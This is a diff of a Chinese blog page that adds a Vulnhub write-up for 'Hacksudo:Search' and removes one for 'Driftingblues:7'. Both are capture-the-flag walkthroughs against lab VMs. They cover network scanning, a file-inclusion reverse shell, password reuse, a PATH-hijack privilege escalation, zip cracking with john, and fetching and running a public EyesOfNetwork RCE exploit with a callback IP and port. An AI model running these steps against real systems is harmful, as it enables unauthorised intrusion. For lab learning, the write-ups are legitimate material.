@@ -82,6 +82,93 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/03/Hacksudo-Search/">
+                Hacksudo Search
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hacksudosearch">Hacksudo:Search</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hacksudosearch">名称：hacksudo:search</span></h4><h4><span id="发布日期2021416">发布日期：2021.4.16</span></h4><h4><span id="作者vishal-waghmare">作者：Vishal Waghmare</span></h4><h4><span id="系列hacksudo">系列：hacksudo</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名hacksudo-searchzip">文件名：hacksudo-search.zip</span></h4><h4><span id="文件大小853mb">文件大小：853MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehacksudohacksudo-searchzip">下载地址：</span></h4><h4><span id="md5-da5af5ca7de9c5fe77cf351631d262a7">MD5: DA5AF5CA7DE9C5FE77CF351631D262A7</span></h4><h4><span id="sha1-28c122bcbd488ffa4b9660123d0a07dafd065581">SHA1: 28C122BCBD488FFA4B9660123D0A07DAFD065581</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Search和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放22，80端口，访问主页是一个搜索框，同时可以直接看到search.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.111 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/4.png" alt="image-"></p>
+<p><img src="/2022/08/03/Hacksudo-Search/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现一个search1.php的文件，可以进行访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.111/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/6.png" alt="image-"></p>
+<p><img src="/2022/08/03/Hacksudo-Search/7.png" alt="image-"></p>
+</blockquote>
+<h3><span id="发现文件包含漏洞">发现文件包含漏洞</span></h3><blockquote>
+<p>1.访问search1.php文件发现比search.php多了上栏，且通过修改About页地址me大小写，能够发现存在文件包含漏洞，在源码中也有提示：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/8.png" alt="image-"></p>
+<p>2.可以通过页面输出内容，也可用测试存在RFI：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/9.png" alt="image-"></p>
+</blockquote>
+<h3><span id="上传webshell">上传webshell</span></h3><blockquote>
+<p>1.修改kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，在同目录下kali开启http服务：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/10.png" alt="image-"></p>
+<p><img src="/2022/08/03/Hacksudo-Search/11.png" alt="image-"></p>
+<p>2.通过文件包含漏洞让靶机获取webshell，kali开启监听端口，访问触发，再用python构建交互式shell：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/12.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/13.png" alt="image-"></p>
+<p>3.在&#x2F;usr&#x2F;www&#x2F;html目录下能够发现一个.env文件，文件内有一个数据库用户和密码，但是无法登录：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/14.png" alt="image-"></p>
+<p>4.后来发现，这个密码是hacksudo用户ssh登录的密码，用户目录下user.txt即是第一个flag：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/15.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.进入hacksudo用户，查看具有root权限的suid文件，尝试提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/16.png" alt="image-"></p>
+<p>2.查询到cpulimit文件，再去<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E6%9F%A5%E8%AF%A2%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%EF%BC%9A">https://gtfobins.github.io/查询提权方式：</a></p>
+<p><img src="/2022/08/03/Hacksudo-Search/17.png" alt="image-"></p>
+<p>3.成功登录root用户，在&#x2F;root目录下发现flag，root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash -i&#x27; &gt; install</span><br><span class="line">chmod +x install</span><br><span class="line">cd ~/search/tools/</span><br><span class="line">export PATH=/tmp/:$PATH</span><br><span class="line">./searchinstall -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/18.png" alt="image-"></p>
+<p>4.在&#x2F;root目录下，可以找到flag，即root.txt:</p>
+<p><img src="/2022/08/03/Hacksudo-Search/19.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hacksudo/" rel="tag">Hacksudo</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/03/Hacksudo-FOG/">
                 Hacksudo FOG
             </a>
@@ -814,94 +901,6 @@
 <p>1.通过利用缓冲区溢出漏洞，我们成功提权到root，在&#x2F;root目录下能够找到flag，即root.txt：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
 <p><img src="/2022/06/06/Driftingblues-9/27.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-7/">
-                Driftingblues 7
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues7">Driftingblues:7</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues7">名称：DriftingBlues:7</span></h4><h4><span id="发布日期2021421">发布日期：2021.4.21</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;flag.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues7_vhova">文件名：driftingblues7_vh.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues7_vhova">下载地址：</span></h4><h4><span id="md5-db16d916b288f8a6440d17046ee99064">MD5: DB16D916B288F8A6440D17046EE99064</span></h4><h4><span id="sha1-39824d3eb1d8da9118a12463b19503d93903b038">SHA1: 39824D3EB1D8DA9118A12463B19503D93903B038</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxcentos">操作系统：Linux(centos)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues7和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-7/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现很多端口都是开放的，访问主页查看源码，发现是一个EyesOfNetwork的登录页：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.119 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，爆出的目录我们都无法访问，必须要先登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://192.168.56.119，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="eyesofnetwork登录">EyesOfNetwork登录</span></h3><blockquote>
-<p>1.因为开放了多个端口，我们逐一进行访问，访问192.168.56.119:66，源码内没有过多线索：</p>
-<p><img src="/2022/06/06/Driftingblues-7/7.png" alt="image-"></p>
-<p>2.我们对66端口下的目录再次进行扫描，直接扫出了一个flag.txt文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.119:66 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，对66端口下目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.119:66/flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/9.png" alt="image-"></p>
-<p>3.这个应该是作者忘记删除的flag文件了，其实应该是想让我们发现eon这个文件：</p>
-<p><img src="/2022/06/06/Driftingblues-7/10.png" alt="image-"></p>
-<p>4.查看eno文件，发现是一串base64编码，解码后发现格式是压缩文件的格式，于是把它解码为application.zip（这里用到了这个在线工具：<a target="_blank" rel="noopener" href="https://base64.guru/converter/decode/file%EF%BC%89%EF%BC%9A">https://base64.guru/converter/decode/file）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.119:66/eon</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/11.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUURw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAAAABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEAAQBbAAAARgAAAAAA | base64 -d</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/12.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/13.png" alt="image-"></p>
-<p>5.利用zip2john对application.zip进行解密，再用john得到密码，查看creds.txt获得用户和密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john application.zip | tee hash</span><br><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/14.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="eyesofnetwork版本漏洞利用">EyesOfNetwork版本漏洞利用</span></h3><blockquote>
-<p>1.利用得到的用户和密码登录EyesOfNetwork后台，发现在Help-EyesOfNetwork页可以发现EyesOfNetwork的版本为5.3：</p>
-<p><img src="/2022/06/06/Driftingblues-7/16.png" alt="image-"></p>
-<p>2.可以找到这个版本的漏洞利用文件，<a target="_blank" rel="noopener" href="https://github.com/h4knet/eonrce/blob/master/eonrce.py%EF%BC%8C%E8%8E%B7%E5%8F%96%E4%B8%8B%E6%9D%A5%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%EF%BC%9A">https://github.com/h4knet/eonrce/blob/master/eonrce.py，获取下来可以直接利用：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/h4knet/eonrce/master/eonrce.py</span><br><span class="line">chmod +x eonrce.py</span><br><span class="line">./eonrce.py https://192.168.3.146/ -ip 192.168.3.145 -port 4444，这里要改一下靶机和kali的网络链接方式，改为桥接模式，命令执行的是桥接模式的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/17.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们可以在&#x2F;root目录下，能够找到flag，即flag.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/18.png" alt="image-"></p>
 </blockquote>
 
 
